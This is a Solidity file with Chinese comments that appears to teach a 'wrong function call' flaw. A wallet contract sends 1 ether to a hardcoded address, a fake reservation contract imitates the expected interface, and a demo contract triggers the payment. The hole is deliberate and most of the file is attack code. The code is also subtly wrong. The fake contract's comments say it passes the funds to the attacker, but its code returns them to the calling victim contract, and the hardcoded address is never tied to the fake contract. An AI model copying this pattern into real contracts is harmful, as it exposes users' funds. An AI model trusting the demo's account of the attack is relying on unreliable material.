// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

// 此介面定義了一個可預訂的合約，提供 reserve 函式
interface IReservable {
    function reserve(uint seats) external payable;
}

// ================= Vulnerable Contract =====================
// FoodBudgetWallet_Vulnerable 合約出現了 Wrong Function Call 漏洞
// 漏洞重點：其內部使用了錯誤的 _restaurant 常數地址，
// 當呼叫 makeReservation 時，會將 1 ether 送至錯誤的地址。
// 如果該地址被攻擊者部署的惡意合約佔領，可能導致資金流失或其它惡意操作。

contract FoodBudgetWallet_Vulnerable {
    // 漏洞：錯誤的餐廳地址，實際上指向攻擊者的合約地址
    address payable constant private _restaurant = payable(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2);

    constructor() payable { }

    // 預訂餐位的函式
    // 漏洞：使用了錯誤的 _restaurant 地址呼叫 reserve() 函式
    function makeReservation(uint seats) public {
        IReservable r = IReservable(_restaurant);
        r.reserve{value: 1 ether}(seats);
    }

    // 接收 Ether 的 fallback 函式
    receive() external payable { }
}

// ================= 攻擊者部署的惡意合約 =====================
// 此合約模擬一個偽裝成 IReservable 的攻擊合約，
// 在呼叫 reserve 函式時執行惡意操作，可能竊取轉入的 Ether
contract FakeReservation {
    event ReceivedReservation(address from, uint seats, uint value);

    // reserve 函式模仿 IReservable 接口，但實際上會將資金轉給攻擊者
    function reserve(uint seats) external payable {
        emit ReceivedReservation(msg.sender, seats, msg.value);
        // 攻擊者將所有的錢轉移走
        payable(msg.sender).transfer(address(this).balance);
    }

    // 接收 Ether
    receive() external payable { }
}

// ================= 攻擊示範合約 =====================
// 此合約展示如何利用 FoodBudgetWallet_Vulnerable 合約中的漏洞
contract AttackDemo {
    FoodBudgetWallet_Vulnerable public victim;
    FakeReservation public attackerContract;

    // 在構造函式中部署 FakeReservation 和受害合約
    constructor() payable {
        // 攻擊者部署 FakeReservation 合約
        attackerContract = new FakeReservation();

        // 此處為演示漏洞，假設 victim 合約中的 _restaurant 地址已硬編碼為 attackerContract 的地址
        victim = new FoodBudgetWallet_Vulnerable();
    }

    // 攻擊示範：攻擊者呼叫 executeAttack，觸發 victim 的 makeReservation
    function executeAttack(uint seats) external payable {
        // 確保呼叫附帶至少 1 ether
        require(msg.value >= 1 ether, "min 1 ether required");
        victim.makeReservation(seats);
    }

    // 接收 Ether
    receive() external payable { }
}